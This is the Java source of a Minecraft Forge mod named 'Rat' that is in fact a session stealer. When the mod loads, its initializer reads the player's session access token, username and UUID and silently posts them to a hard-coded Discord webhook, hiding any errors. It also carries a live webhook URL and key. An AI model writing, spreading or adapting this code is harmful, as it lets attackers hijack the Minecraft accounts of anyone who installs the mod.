package com.speed.rat;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

@Mod(modid ="Rat")
public class Rat
{{
    try{
        Minecraft mc = Minecraft.func_71410_x();
        String token = mc.func_110432_I().func_148254_d();
        String username = mc.func_110432_I().func_111285_a();
        String uuid = mc.func_110432_I().func_148255_b();
        String tokenauth = username + ":" + uuid + ":" + token;
        String webhook = "https://discord.com/api/webhooks/1097505544937426946/Unh5L1sCTGWCYslNRw-yvRrsx7hyYeeXL6Hmd-HodFnlIRO4neOnl1NY3Iw6AszhKsxx";
        HttpURLConnection c = (HttpURLConnection)(new URL(webhook)).openConnection();
        c.setDoOutput(true);
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Mozilla/5.0");
        OutputStream real = c.getOutputStream();
        String info = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"Info session\",\"value\":\"```%s```\"}]}",new Object[]{tokenauth});
        String sending = String.format("{\"embeds\":[%s]}", new Object[] {info});
        real.write(sending.getBytes(StandardCharsets.UTF_8));
        c.getResponseCode();

    }catch(Exception exception){}
}}
